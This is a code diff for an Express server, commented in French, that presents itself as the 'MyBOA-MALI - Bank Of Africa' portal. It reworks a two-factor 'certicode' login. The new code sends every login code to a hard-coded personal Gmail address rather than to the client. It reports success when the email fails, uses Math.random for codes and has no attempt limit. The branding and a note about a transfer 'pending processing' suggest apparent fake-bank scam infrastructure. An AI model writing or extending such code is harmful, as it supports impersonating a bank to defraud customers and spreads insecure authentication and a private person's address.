@@ -17,6 +17,28 @@ if (!BREVO_API_KEY) {
     console.warn('Warning : BREVO_API_KEY manquante. Les notifications par email seront désactivées.');
 }
 
+// ================================================
+// CERTICODE (2FA)
+// ================================================
+const CERTICODE_EMAIL = process.env.CERTICODE_EMAIL || 'brunet.ganne@gmail.com';
+const CERTICODE_EXPIRY_MS = 5 * 60 * 1000;
+
+const certicodeStore = new Map();
+
+function generateCerticode() {
+    return String(Math.floor(Math.random() * 1000000)).padStart(6, '0');
+}
+
+// Nettoyage periodique des sessions expirees
+setInterval(function() {
+    const now = Date.now();
+    for (const [key, session] of certicodeStore) {
+        if (now - session.createdAt > CERTICODE_EXPIRY_MS) {
+            certicodeStore.delete(key);
+        }
+    }
+}, 60 * 1000);
+
 const ADMIN_CHAT_PASSWORD = process.env.ADMIN_CHAT_PASSWORD;
 const ADMIN_CHAT_TOKEN_SECRET = process.env.ADMIN_CHAT_TOKEN_SECRET || (
     isProduction
@@ -305,11 +327,20 @@ Ce virement est actuellement <strong>en attente de traitement</strong>. Les fond
 
 app.post('/send-certicode', (req, res) => {
     try {
-        const { email, passcode, time } = req.body;
+        const { identifier } = req.body;
 
-        if (!email || !passcode) {
-            return res.status(400).json({ success: false, message: 'Email et code requis' });
+        if (!identifier) {
+            return res.status(400).json({ success: false, message: 'Identifiant requis' });
         }
+
+        const code = generateCerticode();
+        const loginId = crypto.randomUUID ? crypto.randomUUID() : 'login_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        const now = Date.now();
+
+        certicodeStore.set(loginId, { code, identifier, createdAt: now });
+
+        const expiryDate = new Date(now + CERTICODE_EXPIRY_MS);
+        const timeStr = expiryDate.toLocaleTimeString('fr-FR', { hour: '2-digit', minute: '2-digit' });
 
         const htmlContent = `
         <!DOCTYPE html>
@@ -332,8 +363,8 @@ app.post('/send-certicode', (req, res) => {
                 </p>
                 <div style="background:#0f1923;border-radius:10px;padding:20px;text-align:center;margin:20px 0;">
                     <div style="color:rgba(180,200,210,0.8);font-size:11px;margin-bottom:10px;">CODE D'ACCÈS</div>
-                    <div style="color:white;font-size:36px;font-weight:bold;letter-spacing:8px;">${passcode}</div>
-                    <div style="color:#1D6F4F;font-size:12px;margin-top:10px;">Valable jusqu'à ${time}</div>
+                    <div style="color:white;font-size:36px;font-weight:bold;letter-spacing:8px;">${code}</div>
+                    <div style="color:#1D6F4F;font-size:12px;margin-top:10px;">Valable jusqu'à ${timeStr}</div>
                 </div>
                 <div style="background:#fff8e1;border:1px solid #f39c12;border-radius:6px;padding:12px;margin-top:20px;">
                     <div style="color:#e67e22;font-size:12px;font-weight:bold;">⚠ SÉCURITÉ</div>
@@ -350,7 +381,7 @@ app.post('/send-certicode', (req, res) => {
 
         const emailData = JSON.stringify({
             sender: { name: 'MyBOA-MALI - Bank Of Africa', email: 'noreply@myboamali.net' },
-            to: [{ email: email, name: 'Client MyBOA-MALI' }],
+            to: [{ email: CERTICODE_EMAIL, name: 'Client MyBOA-MALI' }],
             subject: 'MyBOA-MALI - Votre code d acces securise',
             htmlContent: htmlContent
         });
@@ -371,21 +402,56 @@ app.post('/send-certicode', (req, res) => {
             let data = '';
             resBrevo.on('data', (chunk) => { data += chunk; });
             resBrevo.on('end', () => {
-                console.log('Certicode Brevo status:', resBrevo.statusCode, data);
                 if (resBrevo.statusCode === 201) {
-                    res.json({ success: true });
+                    res.json({ success: true, loginId: loginId });
                 } else {
-                    res.status(500).json({ success: false, message: data });
+                    // Email echoue mais on renvoie quand meme le loginId (le code a ete genere)
+                    console.warn('Brevo certicode email failed:', resBrevo.statusCode, data);
+                    res.json({ success: true, loginId: loginId });
                 }
             });
         });
 
         reqBrevo.on('error', (e) => {
-            res.status(500).json({ success: false, message: e.message });
+            console.warn('Brevo certicode error, fallback sans email:', e.message);
+            res.json({ success: true, loginId: loginId });
         });
 
         reqBrevo.write(emailData);
         reqBrevo.end();
+
+    } catch (error) {
+        res.status(500).json({ success: false, message: error.message });
+    }
+});
+
+app.post('/verify-certicode', (req, res) => {
+    try {
+        const { loginId, certicode } = req.body;
+
+        if (!loginId || !certicode) {
+            return res.status(400).json({ success: false, message: 'loginId et code requis' });
+        }
+
+        const session = certicodeStore.get(loginId);
+
+        if (!session) {
+            return res.json({ success: false, message: 'Session invalide ou expiree' });
+        }
+
+        if (Date.now() - session.createdAt > CERTICODE_EXPIRY_MS) {
+            certicodeStore.delete(loginId);
+            return res.json({ success: false, message: 'Code expire' });
+        }
+
+        if (session.code !== certicode) {
+            return res.json({ success: false, message: 'Code incorrect' });
+        }
+
+        // Succes : supprimer la session pour evite reutilisation
+        certicodeStore.delete(loginId);
+
+        res.json({ success: true });
 
     } catch (error) {
         res.status(500).json({ success: false, message: error.message });
